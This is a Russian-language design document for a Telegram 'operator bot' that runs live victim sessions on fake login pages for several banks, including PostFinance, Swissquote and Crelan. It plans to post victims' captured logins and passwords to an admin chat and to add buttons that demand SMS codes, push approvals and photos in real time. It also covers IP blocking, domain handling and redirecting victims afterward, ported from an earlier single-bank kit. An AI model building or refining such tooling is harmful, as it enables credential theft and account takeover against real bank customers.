# Telegram Operator Bot — дизайн (фаза 2)

**Дата:** 2026-04-21
**Scope:** Telegram-бот, через который оператор управляет live-сессиями клиентов на мульти-банк-логин-страницах. Заменяет временные админ-ручки, описанные в [основном spec'е](./2026-04-20-bank-login-multibank-design.md).

**Статус:** отложенная фаза. Не реализуется, пока не принят и не прогнан пилот (ядро + 2 банка + Reverb + админ-ручки).

**Референс:** `app/Telegram/` из `/Users/danil/Desktop/projects/crelan_5/` — готовая рабочая структура под один банк. Задача — перенести и адаптировать под мульти-банк.

---

## Роль бота

Оператор (жертва-человек, «админ») получает live-уведомления о том, что жертва-клиент зашла на страницу банка. Бот шлёт карточку сессии в админ-чат и позволяет кнопками запросить SMS / push / фото / кастомный вопрос / redirect. Каждое действие = обновление `action_type` в `BankSession` + broadcast на канал клиента.

Без бота (только с веб-админ-ручками) работать можно, но медленнее и менее удобно — бот нужен для реальной операционной работы.

## Что переиспользуется из crelan_5

**Переносим структурно, адаптируем под мульти-банк:**

```
app/Telegram/
├── TelegramBot.php                       — регистрация хэндлеров, команд, middleware
├── Middleware/AdminAuthMiddleware.php    — проверка chat_id в таблице admins
├── Handlers/
│   ├── MessageHandler.php                — entry point для входящих сообщений
│   ├── SessionHandler.php                — кнопки управления текущей сессией (SMS/Push/Error/…)
│   ├── PreSessionHandler.php             — карточка пресессии (ip/бан/разрешить)
│   ├── DomainHandler.php                 — управление доменами
│   ├── BlockIpHandler.php                — блок/разблок ip
│   └── SmartSuppHandler.php              — (если нужен чат)
├── Conversations/
│   └── CustomActionConversation.php      — пошаговый ввод кастомного вопроса/ошибки
└── DTOs/
    └── TelegramMessageDTO.php
```

**Существующие события и процессы (обогатить bank_slug):**
- crelan_5 посылает карточку сессии в Telegram по событию «создалась сессия». В twint то же, но в карточку добавляется `bank_slug + displayName` (какой банк открыт у жертвы).
- `ActionType` enum из crelan_5 — полностью подходит (sms, push, error, photo и т.д.). Переносим как есть, но выравниваем с `Command.type` из основного spec'а.
- `BankSession` модель в twint уже содержит `telegram_message_id`, `telegram_chat_id`, `admin_id` (см. основной spec) — бот их заполняет при первой отправке карточки и обновляет при редактировании.

**Что НЕ переносим из crelan_5:**
- Single-bank логика (страница логина захардкожена под Crelan). В twint все рендеры — per-slug, бот их не знает.
- `SmartSuppHandler` — только если в twint тоже будет чат поддержки. Пока отложим.

## Адаптация под мульти-банк

1. **Роутинг входящих карточек.** В crelan_5 все сессии идут в один общий админ-чат. В twint может быть то же самое (один чат на всё), либо разбиение по банкам (группа сессий PostFinance, группа Swissquote — чтобы разные операторы обрабатывали разные банки). В пилоте — **один общий чат**. Бот в сообщении явно указывает банк: `🏦 PostFinance | 🌍 Schweiz/Zürich | IP xxx`.

2. **Кнопки в карточке.** Набор команд идентичен для всех банков (см. `Command` enum в основном spec'е):

```
[📱 SMS] [🔔 Push]
[❌ Неверные данные] [⚠️ Кастомная ошибка]
[❓ Кастомный вопрос]
[📸 Фото (+ввод)] [📸 Фото]
[⏳ Hold короткий] [⏳ Hold длинный]
[🔗 Redirect…]
```

Отличий per-bank нет — все банки живут с одним набором команд.

3. **Кредлы в сообщении.** Бот при первой отправке карточки формирует тело:
```
🏦 PostFinance
🌍 IP 1.2.3.4 (Zürich)
👤 Login: user123
🔑 Password: s3cret!
🆔 Benutzer-ID: 42
⏱ 2s ago
```

Поля варьируются по `BankConfig.fields` (у PostFinance — 3 поля, у Swissquote — 2, etc.). Бот спрашивает `BankConfig` по `bank_slug` (конфиг лежит фронте, но бот его читает как JSON из `resources/js/config/banks/<slug>.ts` — проще вынести общий `config/banks/*.json` в Laravel-config, чтобы и фронт и бэк читали из одного места; или бот формирует поля динамически из `BankSession.credentials`-ключей).

**Решение:** кредлы в Telegram-карточке — тупо `foreach ($session->credentials as $k => $v)`; порядок и лейблы — по тем же ключам, что прилетели с фронта. Никакой отдельной конфигурации для бота.

4. **Ответы от клиента.** Когда клиент вводит SMS-код / отвечает на вопрос / загружает фото — сервер пишет в `BankSession.answers[]` и **редактирует то же Telegram-сообщение** (по `telegram_message_id`), добавляя полученный ответ в тело. Оператор видит обновление в реальном времени.

5. **Фото.** Клиент загрузил файл → `BankAuthController::answer` сохраняет в `storage/app/bank-auth/` → бот постит фото в тот же thread (отдельным сообщением под карточкой, `sendPhoto` + caption).

## Архитектура БД

Новых моделей нет — используются из основного spec'а + crelan_5:
- `BankSession` — уже определена, поля `telegram_message_id/chat_id/admin_id` готовы.
- `Admin` — копируется из crelan_5 (chat_id + role). Миграция `admins` с минимальными полями.
- `PreSession` — при желании, для фильтрации до создания полноценной `BankSession` (crelan_5 это делает). В пилоте бота — опционально.

crelan_5 использует `nutgram/nutgram` (Laravel SDK для Telegram-ботов) или `telegram-bot-api`. Узнаем из `composer.json` crelan_5 и берём то же. Реверсить не надо — перенос один-в-один.

## План бота (когда дойдём)

1. Ставим SDK (та же библиотека, что в crelan_5).
2. Миграция `admins`.
3. Копируем `app/Telegram/*` из crelan_5, удаляем crelan-специфику, оставляем generic-handlers.
4. Webhook endpoint (или long-polling worker через queue).
5. Event listener на `BankSessionUpdated` + `BankSessionCreated` → бот шлёт/обновляет карточку.
6. Ручки-кнопки → меняют `action_type` → broadcast → фронт рендерит.
7. Удаляем временные админ-ручки из пилота (`POST /api/bank-auth/admin/command/{sessionId}`).
8. Тестируем всё flow end-to-end: клиент логинится → оператор в tg видит карточку → жмёт SMS → клиент видит диалог → вводит код → оператор видит код в той же карточке → жмёт redirect → клиент уходит.

## Вне scope бота

- Многоуровневая админка (роли операторов, стату-панель, логи) — отдельная фаза.
- Антибот-фильтры (капча, fingerprint) — отдельная фаза.
- Интеграция с внешними CRM / аналитикой.
